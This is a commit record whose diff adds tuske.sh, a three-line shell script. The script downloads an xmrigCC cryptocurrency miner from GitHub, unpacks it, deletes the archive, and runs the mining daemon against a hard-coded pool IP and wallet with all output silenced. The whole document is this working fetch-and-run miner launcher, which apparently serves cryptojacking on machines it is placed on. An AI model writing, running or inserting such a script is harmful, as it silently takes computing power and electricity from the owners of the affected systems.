8c43d4e10b725562f03ae1d050183a04bece2c50
ladora <ladora@qdeathse.com>
2024-06-04 13:14:45 +0000

    tuske.sh created online with Bitbucket

---
+++ tuske.sh
@@ -0,0 +1,3 @@
+#!/bin/sh
+
+wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 165.227.180.199:443 -u TuskeSyuW6sgYgHsxkhyYKXCQ237sin7aRGbRkpcwMR5WV9jLHRKMLMWBb9bkWRL8hLWbCVjzHRo3TzXKU1BuTeyh1bK1zfD5KzK6u.anyar -k -a rx/tuske -t4 > /dev/null 2>&1
